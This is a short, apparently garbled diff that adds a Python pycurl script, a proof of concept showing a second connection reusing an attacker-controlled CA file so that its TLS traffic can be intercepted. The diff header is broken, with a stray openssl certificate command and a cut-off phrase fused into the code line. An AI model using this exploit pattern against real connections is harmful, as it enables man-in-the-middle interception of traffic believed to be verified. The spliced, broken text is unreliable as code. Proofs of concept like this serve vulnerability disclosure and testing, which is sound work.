@@ -75,3 +75,37 @@ def main():
 
 if __name__ == "__main__":
     main()openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 to cre
+#!/usr/bin/env python3
+
+import pycurl
+
+def main():
+    # simulated attacker controlled connection with crafted CA.crt file
+    c1 = pycurl.Curl()
+    c1.setopt(pycurl.URL, "https://curl.se")
+    c1.setopt(pycurl.CAINFO, '/tmp/CA.crt')
+
+    # simulated connection in another security context that the attacker tries to MiTM
+    c2 = pycurl.Curl()
+    c2.setopt(pycurl.URL, "https://curl.se")
+    c2.setopt(pycurl.CAINFO, '/tmp/ca.crt')
+
+    m = pycurl.CurlMulti()
+    m.add_handle(c1)
+
+    while True:
+        ret, num_handles = m.perform()
+        if ret != pycurl.E_CALL_MULTI_PERFORM: break
+    while num_handles:
+        ret = m.select(1.0)
+        if ret == -1: break
+        while True:
+            ret, num_handles = m.perform()
+            if ret != pycurl.E_CALL_MULTI_PERFORM: break
+
+        numq, oklist, errlist = m.info_read(2)
+        if c1 in oklist:
+            m.add_handle(c2)
+
+if __name__ == "__main__":
+    main()
